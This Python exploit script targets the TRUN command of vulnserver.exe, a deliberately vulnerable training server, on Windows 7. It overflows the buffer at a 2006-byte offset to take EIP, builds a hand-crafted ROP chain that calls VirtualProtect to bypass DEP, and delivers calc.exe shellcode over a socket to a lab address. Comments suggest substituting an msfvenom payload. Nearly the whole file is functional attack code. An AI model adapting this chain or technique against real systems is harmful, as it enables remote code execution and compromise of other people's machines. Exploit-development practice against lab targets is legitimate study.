# vulnserver.exe DEP bypass
# Author: Connor McGarr
# ROP'd this bad boy by hand (sorry mona)
# Windows 7
import struct
import sys
import os
import socket

# Vulnerable command
command = "TRUN ."

# 2006 byte offset to EIP
crash = "\x41" * 2006

# Stack Pivot (returning to the stack without a jmp/call)
crash += struct.pack('<L', 0x62501022)    # ret essfunc.dll

# Beginning of ROP chain

# Saving ESP into ECX and EAX
rop = struct.pack('<L', 0x77bf58d2)  # 0x77bf58d2: push esp ; pop ecx ; ret  ;  (1 found)
rop += struct.pack('<L', 0x77e4a5e6) # 0x77e4a5e6: mov eax, ecx ; ret  ;  (1 found)

# Jump over parameters
rop += struct.pack('<L', 0x6ff821d5) # 0x6ff821d5: add esp, 0x1C ; ret  ;  (1 found)

# Calling VirtualProtect with parameters
parameters = struct.pack('<L', 0x77e22e15)    # kernel32.VirtualProtect()
parameters += struct.pack('<L', 0x4c4c4c4c)    # return address (address of shellcode, or where to jump after VirtualProtect call. Not officially apart of the "parameters"
parameters += struct.pack('<L', 0x45454545)    # lpAddress
parameters += struct.pack('<L', 0x03030303)    # size of shellcode
parameters += struct.pack('<L', 0x54545454)    # flNewProtect
parameters += struct.pack('<L', 0x62506060)    # pOldProtect (any writeable address)

# Padding to reach gadgets
padding = "\x90" * 4

# add esp, 0x1C + ret will land here
# Increase ECX C bytes (ECX right now contains old ESP) to equal address of the VirtualProtect return address place holder
# (no pointers have been created yet)
rop2 = struct.pack ('<L', 0x77e17270)   # 0x77e17270: inc ecx ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77e17270)   # 0x77e17270: inc ecx ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77e17270)   # 0x77e17270: inc ecx ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77e17270)   # 0x77e17270: inc ecx ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77e17270)   # 0x77e17270: inc ecx ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77e17270)   # 0x77e17270: inc ecx ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77e17270)   # 0x77e17270: inc ecx ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77e17270)   # 0x77e17270: inc ecx ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77e17270)   # 0x77e17270: inc ecx ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77e17270)   # 0x77e17270: inc ecx ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77e17270)   # 0x77e17270: inc ecx ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77e17270)   # 0x77e17270: inc ecx ; ret  ;  (1 found)

# Move ECX into EDX, and increase it 4 bytes to reach location of VirtualProtect lpAddress parameter
# (no pointers have been created yet. Just preparation)
# Now ECX contains the address of the VirtualProtect return address
# Now EDX (after the inc edx instructions), contains the address of the VirtualProtect lpAddress location
rop2 += struct.pack ('<L', 0x6ffb6162)  # 0x6ffb6162: mov edx, ecx ; pop ebp ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x50505050)  # padding to compensate for pop ebp in the above ROP gadget
rop2 += struct.pack ('<L', 0x77f226d5)  # 0x77f226d5: inc edx ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77f226d5)  # 0x77f226d5: inc edx ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77f226d5)  # 0x77f226d5: inc edx ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77f226d5)  # 0x77f226d5: inc edx ; ret  ;  (1 found)

# Increase EAX, which contains old ESP, to equal around the address of shellcode
# Determine how far shellcode is away, and add that difference into EAX, because
# EAX is being used for calculations
rop2 += struct.pack('<L', 0x6ff7e29a)    # 0x6ff7e29a: add eax, 0x00000100 ; pop ebp ; ret  ;  (1 found)
rop2 += struct.pack('<L', 0x41414141)    # padding to compensate for pop ebp in the above ROP gadget
rop2 += struct.pack('<L', 0x6ff7e29a)    # 0x6ff7e29a: add eax, 0x00000100 ; pop ebp ; ret  ;  (1 found)
rop2 += struct.pack('<L', 0x41414141)    # padding to compensate for pop ebp in the above ROP gadget

# Replace current VirtualProtect return address pointer (the placeholder) with pointer to shellcode location
rop2 += struct.pack ('<L', 0x6ff63bdb)   # 0x6ff63bdb mov dword [ecx], eax ; pop ebp ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x41414141)   # padding to compensate for pop ebp instruction in the above ROP gadget

# Replace VirtualProtect lpAddress placeholder with pointer to shellcode location
rop2 += struct.pack ('<L', 0x77e942cb)   # 0x77e942cb: mov dword [edx], eax ; pop esi ; pop ebp ; retn 0x000C ;  (1 found)
rop2 += struct.pack ('<L', 0x41414141)   # padding to compensate for pop esi instruction in the last ROP gadget
rop2 += struct.pack ('<L', 0x41414141)   # padding to compensate for pop ebp instruction in the last ROP gadget

# Preparing the VirtualProtect size parameter (third parameter)
# Changing EAX to equal the third parameter, size (0x300).
# Increase EDX 4 bytes (to reach the VirtualProtect size parameter placeholder.)
# Remember, EDX currently is located at the VirtualProtect lpAddress placeholder.
# The size parameter is located 4 bytes after the lpAddress parameter
# Lastly, point EAX to new EDX
rop2 += struct.pack ('<L', 0x41ad61cc)   # 0x41ad61cc: xor eax, eax ; ret ; (1 found)
rop2 += struct.pack ('<L', 0x41414141)   # padding to compensate for retn 0x000C in the lpAddress ROP gadget
rop2 += struct.pack ('<L', 0x41414141)   # padding to compensate for retn 0x000C in the lpAddress ROP gadget
rop2 += struct.pack ('<L', 0x41414141)   # padding to compensate for retn 0x000C in the lpAddress ROP gadget
rop2 += struct.pack ('<L', 0x6ff7e29a)   # 0x6ff7e29a: add eax, 0x00000100 ; pop ebp ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x41414141)   # padding to compensate for pop ebp instruction in the above ROP chain
rop2 += struct.pack ('<L', 0x6ff7e29a)   # 0x6ff7e29a: add eax, 0x00000100 ; pop ebp ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x41414141)   # padding to compensate for pop ebp instruction in the above ROP chain
rop2 += struct.pack ('<L', 0x6ff7e29a)   # 0x6ff7e29a: add eax, 0x00000100 ; pop ebp ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x41414141)   # padding to compensate for pop ebp instruction in the above ROP chain
rop2 += struct.pack ('<L', 0x77f226d5)  # 0x77f226d5: inc edx ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77f226d5)  # 0x77f226d5: inc edx ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77f226d5)  # 0x77f226d5: inc edx ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77f226d5)  # 0x77f226d5: inc edx ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77e942cb)   # 0x77e942cb: mov dword [edx], eax ; pop esi ; pop ebp ; retn 0x000C ;  (1 found)
rop2 += struct.pack ('<L', 0x41414141)   # padding to compensate for pop esi instruction in the above ROP gadget
rop2 += struct.pack ('<L', 0x41414141)   # padding to compensate for pop ebp instruction in the above ROP gadget

# Preparing the VirtualProtect flNewProtect parameter (fourth parameter)
# Changing EAX to equal the fourth parameter, flNewProtect (0x40)
# Increase EDX 4 bytes (to reach the VirtualProtect flNewProtect placeholder.)
# Remember, EDX currently is located at the VirtualProtect size placeholder.
# The flNewProtect parameter is located 4 bytes after the size parameter.
# Lastly, point EAX to the new EDX
rop2 += struct.pack ('<L', 0x41ad61cc)  # 0x41ad61cc: xor eax, eax ; ret ; (1 found)
rop2 += struct.pack ('<L', 0x41414141)  # padding to compensate for retn 0x000C in the size ROP gadget
rop2 += struct.pack ('<L', 0x41414141)  # padding to compensate for retn 0x000C in the size ROP gadget
rop2 += struct.pack ('<L', 0x41414141)  # padding to compensate for retn 0x000C in the size ROP gadget
rop2 += struct.pack ('<L', 0x77bd6b18)	# 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77bd6b18)  # 0x77bd6b18: add eax, 0x02 ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77f226d5)  # 0x77f226d5: inc edx ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77f226d5)  # 0x77f226d5: inc edx ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77f226d5)  # 0x77f226d5: inc edx ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77f226d5)  # 0x77f226d5: inc edx ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77e942cb)  # 0x77e942cb: mov dword [edx], eax ; pop esi ; pop ebp ; retn 0x000C ;  (1 found)
rop2 += struct.pack ('<L', 0x41414141)  # padding to compensate for pop esi instruction in the above ROP gadget
rop2 += struct.pack ('<L', 0x41414141)  # padding to compensate for pop ebp instruction in the above ROP gadget

# Now we need to return to where the VirutalProtect call is on the stack.
# ECX contains a value around the old stack pointer at this time (from the beginning). Put ECX into EAX
# and decrement EAX to get back to the function call- and then load EAX into ESP.
# Restoring the old stack pointer here.
rop2 += struct.pack ('<L', 0x77e4a5e6)   # 0x77e4a5e6: mov eax, ecx ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x41414141)   # padding to compensate for retn 0x000C in the flNewProtect ROP gadget
rop2 += struct.pack ('<L', 0x41414141)   # padding to compensate for retn 0x000C in the flNewProtect ROP gadget
rop2 += struct.pack ('<L', 0x41414141)   # padding to compensate for retn 0x000C in the flNewProtect ROP gadget
rop2 += struct.pack ('<L', 0x41ac863b)   # 0x41ac863b: dec eax ; dec eax ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x41ac863b)  # 0x41ac863b: dec eax ; dec eax ; ret  ;  (1 found)
rop2 += struct.pack ('<L', 0x77d6fa6a)   # 0x77d6fa6a: xchg eax, esp ; ret  ;  (1 found)

# Padding between ROP Gadgets and shellcode. Arbitrary number (just make sure you have enough room on the stack)
padding2 = "\x90" * 250

# calc.exe POC payload created with the Windows API system() function.
# You can replace this with an msfvenom payload if you would like
shellcode = "\x31\xc0\x50\x68"
shellcode += "\x63\x61\x6c\x63"
shellcode += "\x54\xbe\x77\xb1"
shellcode += "\xfa\x6f\xff\xd6"

# 5000 byte total crash
filler = "\x43" * (5000-len(command)-len(crash)-len(parameters)-len(padding)-len(rop)-len(padding2)-len(padding2))
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.148", 9999))
s.send(command+crash+rop+parameters+padding+rop2+padding2+shellcode+filler)
s.close()
